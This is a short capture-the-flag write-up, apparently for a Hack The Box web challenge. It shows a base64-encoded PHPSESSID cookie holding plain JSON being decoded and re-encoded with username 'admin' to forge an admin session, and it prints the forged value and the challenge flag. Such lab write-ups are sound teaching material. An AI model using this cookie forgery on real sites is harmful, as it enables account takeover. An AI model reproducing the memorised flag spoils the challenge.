# baby auth

:::note CHALLENGE DESCRIPTION

Difficulty: EASY

Who needs session integrity these days?

如今谁还需要会话完整性呢？

:::

直接访问

![img](img/image_20250358-085828.png)

既然有注册功能，就随便注册一个账户

![img](img/image_20250359-085932.png)

用注册的`123:123`账户进行登录

![img](img/image_20250300-090001.png)

查看Cookie信息

![img](img/image_20250300-090037.png)

```plaintext
PHPSESSID:"eyJ1c2VybmFtZSI6IjEyMyJ9"
```

尝试对其进行解码

![img](img/image_20250301-090140.png)

```plaintext
{"username":"123"}
```

那就很简单了，直接伪造成admin就可以了

```plaintext
{"username":"admin"}

eyJ1c2VybmFtZSI6ImFkbWluIn0=
```

![img](img/image_20250302-090258.png)

即可获得答案

```flag
HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}
```
